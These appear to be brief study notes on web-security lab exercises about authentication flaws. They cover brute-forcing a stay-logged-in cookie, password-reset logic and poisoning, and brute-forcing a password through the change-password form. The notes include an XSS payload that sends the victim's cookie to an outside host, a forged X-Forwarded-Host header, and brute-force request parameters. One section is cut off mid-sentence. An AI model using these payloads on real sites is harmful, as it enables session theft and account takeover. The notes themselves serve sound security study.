### Brute-forcing a stay-logged-in cookie

    Cookie = Base64encode('username' + ':' + hashMD5(password))
    In the 

### Offline password cracking

    Make use of XSS in the comment section:
    <img src="1" onerror="fetch('http:localhost:3000/?cookie=' + document.cookie)">

    Go to the server and obtain the cookie (the cookie is constructed the same as the lab above)
    -> Base64 decode it and crack the hash using crackstation.

### Password reset broken logic

    The reset password token is not bind to a specific user
    -> resend the POST request to reset password of a valid user and change the username to 'carlos'

### Password reset poisoning via middleware

    Change the username to 'carlos' and add to the POST request to /forgot-password this header: 
    X-Forwarded-Host: exploit-0aae00af04e5894e80781b14012000b0.exploit-server.net
    -> The server will treat this host as the original host and send the reset password link to the victim's email with this host as the domain : 
    https://exploit-0aae00af04e5894e80781b14012000b0.exploit-server.net/forgot-password?temp-forgot-password-token=r6kc51tllctfof5iwoz5t0p0jmjuosph

    The victim clicks on this link which makes a GET request to the attacker's server
    -> the attacker obtains the token

### Password brute-force via password change

    Notice when entering 2 new passwords that don't match:
    - If the current password is correct -> "New passwords do not match"
    - If the current password is incorrect -> "Current password is incorrect"
    
    Change the POST request /my-account/change-password with username=carlos&current-password=2&new-password-1=2&new-password-2=3
    Bruteforce the current password and look for 1 that returns "New passwords do not match"